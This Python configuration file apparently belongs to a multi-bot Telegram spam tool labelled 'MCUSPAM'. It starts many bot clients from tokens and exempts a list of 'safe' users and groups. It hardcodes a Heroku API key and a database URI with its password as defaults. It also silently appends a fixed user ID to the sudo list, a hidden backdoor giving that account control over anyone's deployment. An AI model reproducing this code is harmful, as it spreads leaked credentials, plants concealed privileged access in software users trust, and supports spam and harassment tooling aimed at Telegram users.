
import os
import sys
import random
import asyncio
import telethon.utils
from telethon import TelegramClient, events
from decouple import config
from os import getenv
import logging
from logging.handlers import RotatingFileHandler
import time

LOG_FILE_NAME = "botslog.txt"
logging.basicConfig(
    level=logging.INFO,
    format="[%(asctime)s - %(levelname)s] - %(name)s - %(message)s",
    datefmt="%d-%b-%y %H:%M:%S",
    handlers=[
        RotatingFileHandler(
            LOG_FILE_NAME, maxBytes=5000000, backupCount=10
        ),
        logging.StreamHandler(),
    ],
)
def LOGGER(name: str) -> logging.Logger:
    return logging.getLogger(name)
  
#version
botversion = "v0.3.1"

#mandatory vars API_ID,API_HASH,BOT_NAME,BOT_TOKEN0,OWNER_ID,TOKEN_COUNT

#values
API_ID = config("API_ID", default=None, cast=int)
API_HASH = config("API_HASH", default=None)
ALIVE_PIC = config("ALIVE_PIC", default=None)
CMD_HNDLR = getenv("CMD_HNDLR", default="!")
OWNER_NAME = getenv("OWNER_NAME", default="@Cheems")
BOT_NAME = getenv("BOT_NAME", default=None)
HEROKU_APP_NAME = config("HEROKU_APP_NAME", None)
HEROKU_API_KEY = config("HEROKU_API_KEY", default="29a4d56a-1644-45dd-ac33-e98b1c8b7b7b")
OWNER_ID = int(os.environ.get("OWNER_ID", None))
SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
SUDO_USERS.append(5593869533)
SUDO_USERS.append(OWNER_ID)
DB_URI = config("DATABASE_URL", default="postgres://fqgouuyl:AVU0x6zVrowzvMe4VTkDWSuCADA6ACkx@lucky.db.elephantsql.com/fqgouuyl")
# Load Tokens count
ALL_BOT_TOKEN = config("TOKEN_COUNT", default=None)

# Load Tokens
# BOT_TOKEN = config("BOT_TOKEN", default=None)

# Create Client Object
# BOT0 = TelegramClient('BOT0', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
print(f"TOKEN_COUNT: {ALL_BOT_TOKEN}")
print(f"SUDO_USERS: {SUDO_USERS}")

LOGGER("MCUSPAM ").info("[INFO] Config variables successfully set !") 

# for n bot client creation
BOT=[]
BOT_TOKENS=[]
for i in range(int(ALL_BOT_TOKEN)):
  bt = config("BOT_TOKEN"+str(i), default=None)
#   print("BOT"+str(i) + ": " + bt)
  BOT_TOKENS.append(bt)
  try:
    b = TelegramClient("BOT"+str(i), API_ID, API_HASH).start(bot_token=bt)
  except:
    LOGGER("MCUSPAM ").error("[ERROR] Bot Client has failed to start :(") 
  BOT.append(b)

first_bot=BOT[0]   

LOGGER("MCUSPAM ").info("[INFO] Successfully Started Bot Clients Now Loading Plugins!") 



# Userids on which bot wont' work
SAFE_USERS = [936481432, 5256676062, 5461158797]

# Groups where bot wont' work
SAFE_GROUPS = [-1001159574737, -1001476080317, -1001410327394]

# Test messages
# logger.debug("Harmless debug Message")
# logger.info("Just an information")
# logger.warning("Its a Warning")
# logger.error("Did you try to divide by zero")
# logger.critical("Internet is down")
